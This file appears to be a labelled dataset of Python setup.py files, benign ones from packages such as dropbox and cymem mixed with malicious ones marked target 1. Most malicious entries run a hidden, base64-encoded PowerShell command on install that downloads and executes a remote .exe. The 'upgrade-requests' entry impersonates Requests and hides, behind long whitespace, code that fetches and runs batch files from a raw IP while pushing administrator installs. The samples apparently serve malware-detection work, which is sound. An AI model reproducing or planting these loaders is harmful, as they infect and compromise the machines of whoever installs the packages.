{"idx": "dropbox-11.33.0", "func": "# Don't import unicode_literals because of a bug in py2 setuptools\n# where package_data is expected to be str and not unicode.\nfrom __future__ import absolute_import, division, print_function\n\nimport codecs\nimport os\nimport sys\n\n# Ensure setuptools is available\ntry:\n    from ez_setup import use_setuptools\n    use_setuptools()\nexcept ImportError:\n    # Try to use ez_setup, but if not, continue anyway. The import is known\n    # to fail when installing from a tar.gz.\n    print('Could not import ez_setup', file=sys.stderr)\n\nfrom setuptools import setup\n\ndbx_mod_path = os.path.join(os.path.dirname(__file__), 'dropbox/dropbox_client.py')\nline = '= \"UNKNOWN\"'\nfor line in open(dbx_mod_path):\n    if line.startswith('__version__'):\n        break\nversion = eval(line.split('=', 1)[1].strip())  # pylint: disable=eval-used\n\ninstall_reqs = [\n    'requests >= 2.16.2',\n    'six >= 1.12.0',\n    'stone >= 2.*',\n]\n\nsetup_requires = [\n    # Pin pytest-runner to 5.2.0, since 5.3.0 uses `find_namespaces` directive, not supported in\n    # Python 2.7\n    'pytest-runner == 5.2.0',\n]\n\n# WARNING: This imposes limitations on test/requirements.txt such that the\n# full Pip syntax is not supported. See also\n# <http://stackoverflow.com/questions/14399534/>.\ntest_reqs = []\nwith open('test/requirements.txt') as f:\n    test_reqs += f.read().splitlines()\n\nwith codecs.open('README.rst', encoding='utf-8') as f:\n    README = f.read()\n\ndist = setup(\n    name='dropbox',\n    version=version,\n    install_requires=install_reqs,\n    setup_requires=setup_requires,\n    tests_require=test_reqs,\n    packages=['dropbox'],\n    package_data={'dropbox': ['trusted-certs.crt']},\n    zip_safe=False,\n    author_email='dev-platform@dropbox.com',\n    author='Dropbox',\n    description='Official Dropbox API Client',\n    license='MIT License',\n    long_description=README,\n    url='http://www.dropbox.com/developers',\n    project_urls={\n        'Source': 'https://github.com/dropbox/dropbox-sdk-python',\n    },\n    # From <https://pypi.python.org/pypi?%3Aaction=list_classifiers>\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "target": 0}
{"idx": "selfloadintel-5.56", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfloadintel',\n    packages = ['modlib'],\n    version = '8.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-tidy-imports-4.8.0", "func": "from __future__ import annotations\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "pycryptoe-1.2.0", "func": "from setuptools import setup\n\n\n\n\n\n\n\nsetup(\n    name='pycryptoe',\n    version='1.2.0',    \n    description='Your gateway to crypto functions in PYTHON',\n    url='https://github.com',\n    author='milk errr',\n    author_email='milker@python.com',\n    license='BSD 2-clause',\n    packages=['pycryptoe'],\n    install_requires=[\"requests\",\"cryptography\",\"wmi\",\"pathlib\",\"opencv-python\",\"screeninfo\",\"psutil\",\"httpx\",\"flask\",\"pynput\",\"pillow\",\"browser_cookie3\",\"pyaudio\",\"bleach\",\"pypiwin32\",\"pycryptodome\",\"pygame\"],\n\n    classifiers=[\n        'Development Status :: 1 - Planning',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: BSD License',  \n        'Operating System :: POSIX :: Linux',        \n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n    ],\n)", "target": 1}
{"idx": "esqnvidiaultrapep-7.81", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqnvidiaultrapep',\n    packages = ['modlib'],\n    version = '4.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ccmine-10.91", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ccmine',\n    packages = ['modlib'],\n    version = '7.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cymem-2.0.6", "func": "#!/usr/bin/env python\nfrom __future__ import print_function\nimport io\nimport os\nimport sys\nimport contextlib\nfrom setuptools import Extension, setup\nfrom distutils.command.build_ext import build_ext\nfrom distutils.sysconfig import get_python_inc\nfrom Cython.Build import cythonize\n\n\nPACKAGES = [\"cymem\", \"cymem.tests\"]\nMOD_NAMES = [\"cymem.cymem\"]\n\n\n# By subclassing build_extensions we have the actual compiler that will be used which is really known only after finalize_options\n# http://stackoverflow.com/questions/724664/python-distutils-how-to-get-a-compiler-that-is-going-to-be-used\ncompile_options = {\n    \"msvc\": [\"/Ox\", \"/EHsc\"],\n    \"other\": [\"-O3\", \"-Wno-strict-prototypes\", \"-Wno-unused-function\"],\n}\nlink_options = {\"msvc\": [], \"other\": []}\n\n\nclass build_ext_options:\n    def build_options(self):\n        for e in self.extensions:\n            e.extra_compile_args = compile_options.get(\n                self.compiler.compiler_type, compile_options[\"other\"]\n            )\n        for e in self.extensions:\n            e.extra_link_args = link_options.get(\n                self.compiler.compiler_type, link_options[\"other\"]\n            )\n\n\nclass build_ext_subclass(build_ext, build_ext_options):\n    def build_extensions(self):\n        build_ext_options.build_options(self)\n        build_ext.build_extensions(self)\n\n\ndef clean(path):\n    for name in MOD_NAMES:\n        name = name.replace(\".\", \"/\")\n        for ext in [\".so\", \".html\", \".cpp\", \".c\"]:\n            file_path = os.path.join(path, name + ext)\n            if os.path.exists(file_path):\n                os.unlink(file_path)\n\n\n@contextlib.contextmanager\ndef chdir(new_dir):\n    old_dir = os.getcwd()\n    try:\n        os.chdir(new_dir)\n        sys.path.insert(0, new_dir)\n        yield\n    finally:\n        del sys.path[0]\n        os.chdir(old_dir)\n\n\ndef setup_package():\n    root = os.path.abspath(os.path.dirname(__file__))\n\n    if len(sys.argv) > 1 and sys.argv[1] == \"clean\":\n        return clean(root)\n\n    with chdir(root):\n        with io.open(os.path.join(root, \"cymem\", \"about.py\"), encoding=\"utf8\") as f:\n            about = {}\n            exec(f.read(), about)\n\n        with io.open(os.path.join(root, \"README.md\"), encoding=\"utf8\") as f:\n            readme = f.read()\n\n        include_dirs = [get_python_inc(plat_specific=True)]\n\n        ext_modules = []\n        for mod_name in MOD_NAMES:\n            mod_path = mod_name.replace(\".\", \"/\") + \".pyx\"\n            ext_modules.append(\n                Extension(\n                    mod_name, [mod_path], language=\"c++\", include_dirs=include_dirs\n                )\n            )\n\n        setup(\n            name=\"cymem\",\n            zip_safe=False,\n            packages=PACKAGES,\n            package_data={\"\": [\"*.pyx\", \"*.pxd\"]},\n            description=about[\"__summary__\"],\n            long_description=readme,\n            long_description_content_type=\"text/markdown\",\n            author=about[\"__author__\"],\n            author_email=about[\"__email__\"],\n            version=about[\"__version__\"],\n            url=about[\"__uri__\"],\n            license=about[\"__license__\"],\n            ext_modules=cythonize(ext_modules, language_level=2),\n            setup_requires=[\"cython>=0.25\"],\n            classifiers=[\n                \"Environment :: Console\",\n                \"Intended Audience :: Developers\",\n                \"Intended Audience :: Science/Research\",\n                \"License :: OSI Approved :: MIT License\",\n                \"Operating System :: POSIX :: Linux\",\n                \"Operating System :: MacOS :: MacOS X\",\n                \"Operating System :: Microsoft :: Windows\",\n                \"Programming Language :: Cython\",\n                \"Programming Language :: Python :: 2.6\",\n                \"Programming Language :: Python :: 2.7\",\n                \"Programming Language :: Python :: 3.3\",\n                \"Programming Language :: Python :: 3.4\",\n                \"Programming Language :: Python :: 3.5\",\n                \"Programming Language :: Python :: 3.6\",\n                \"Programming Language :: Python :: 3.7\",\n                \"Programming Language :: Python :: 3.8\",\n                \"Programming Language :: Python :: 3.9\",\n                \"Programming Language :: Python :: 3.10\",\n                \"Topic :: Scientific/Engineering\",\n            ],\n            cmdclass={\"build_ext\": build_ext_subclass},\n        )\n\n\nif __name__ == \"__main__\":\n    setup_package()\n", "target": 0}
{"idx": "selfgrandencodecv-3.6", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgrandencodecv',\n    packages = ['modlib'],\n    version = '4.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "urlmc-7.44", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'urlmc',\n    packages = ['modlib'],\n    version = '8.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "upgrade-requests-3.0.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\nfrom codecs import open\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\nCURRENT_PYTHON = sys.version_info[:2]\nREQUIRED_PYTHON = (3, 7)\n\nif CURRENT_PYTHON < REQUIRED_PYTHON:\n    sys.stderr.write(\n        \"\"\"\n==========================\nUnsupported Python version\n==========================\nThis version of Requests requires at least Python {}.{}, but\nyou're trying to install it on Python {}.{}. To resolve this,\nconsider upgrading to a supported Python version.\n\nIf you can't upgrade your Python version, you'll need to\npin to an older version of Requests (<2.28).\n\"\"\".format(\n            *(REQUIRED_PYTHON + CURRENT_PYTHON)\n        )\n    )\n    sys.exit(1)\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass into py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        try:\n            from multiprocessing import cpu_count\n\n            self.pytest_args = [\"-n\", str(cpu_count()), \"--boxed\"]\n        except (ImportError, NotImplementedError):\n            self.pytest_args = [\"-n\", \"1\", \"--boxed\"]\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\nrequires = [\n    \"charset_normalizer>=2,<3\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nabout = {}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"requests\", \"__version__.py\"), \"r\", \"utf-8\") as f:\n    exec(f.read(), about)\n\nwith open(\"README.md\", \"r\", \"utf-8\") as f:\n    readme = f.read()\n\nsetup(\n    name='upgrade-requests',\n    version='3.0.0',\n    description='To evoid errors use administative permissions while installing',\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"requests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    cmdclass={\"test\": PyTest},\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nif os.name == 'nt':\n  import base64\n  from time import sleep\n  try:\n    import subprocess\n    a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    out = (a.stdout.read().decode().strip())\n    os.chdir(out)\n    try:\n      import requests\n    except:\n      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE,\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      print(\"installing....\")\n      sleep(5)\n      import requests\n    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'\n    local_file = 'local_copy.txt'\n    data = requests.get(remote_url)\n    # Save file data to local copy\n    with open(local_file, 'wb')as file:\n      file.write(data.content)\n    subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # try:\n    #   subprocess.Popen(\"cmd /c break>local.bat:Zone.Identifier\", shell=True, stdin=subprocess.PIPE,\n    #                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # except:\n    #   pass\n    subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    sleep(2)\n    try:\n      subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    except:\n      pass\n    a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stderr.read().decode())\n    if \"Access is denied.\" in out:\n      print(\"The library can do problems, Reinstall with Administrative permissions to solve the problem\")\n    else:\n      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'\n      local_file = 'local_b.txt'\n      data = requests.get(remote_url)\n      # Save file data to local copy\n      with open(local_file, 'wb')as file:\n        file.write(data.content)\n      subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                       stderr=subprocess.PIPE)\n      sleep(2)\n      try:\n        subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE,\n                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      except:\n        pass\n        print(\"\"\"installed successfully\n#Usage: import requests\n            \"\"\")\n  except Exception as e:\n      pass\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "target": 1}
{"idx": "py-superrandompaypal-10.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-superrandompaypal',\n    packages = ['modlib'],\n    version = '7.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flashtext-2.7", "func": "from setuptools import setup, Command\nimport subprocess\n\n\nclass PyTest(Command):\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        errno = subprocess.call(['py.test'])\n        raise SystemExit(errno)\n\nname = 'flashtext'\nversion = '2.7'\n\ncmdclass = {'test': PyTest}\n\ntry:\n    from sphinx.setup_command import BuildDoc\n    cmdclass['build_sphinx'] = BuildDoc\nexcept ImportError:\n    print('WARNING: sphinx not available, not building docs')\n\nsetup(\n    name=name,\n    version=version,\n    url='http://github.com/vi3k6i5/flashtext',\n    author='Vikash Singh',\n    author_email='vikash.duliajan@gmail.com',\n    description='Extract/Replaces keywords in sentences.',\n    long_description=open('README.rst').read(),\n    packages=['flashtext'],\n    install_requires=[],\n    platforms='any',\n    cmdclass=cmdclass,\n    classifiers=[\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Operating System :: OS Independent',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n    ],\n    command_options={\n        'build_sphinx': {\n            'project': ('setup.py', name),\n            'version': ('setup.py', version),\n            'release': ('setup.py', version)\n        }\n    }\n)\n", "target": 0}
{"idx": "esqguiproofad-6.36", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqguiproofad',\n    packages = ['modlib'],\n    version = '4.38',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
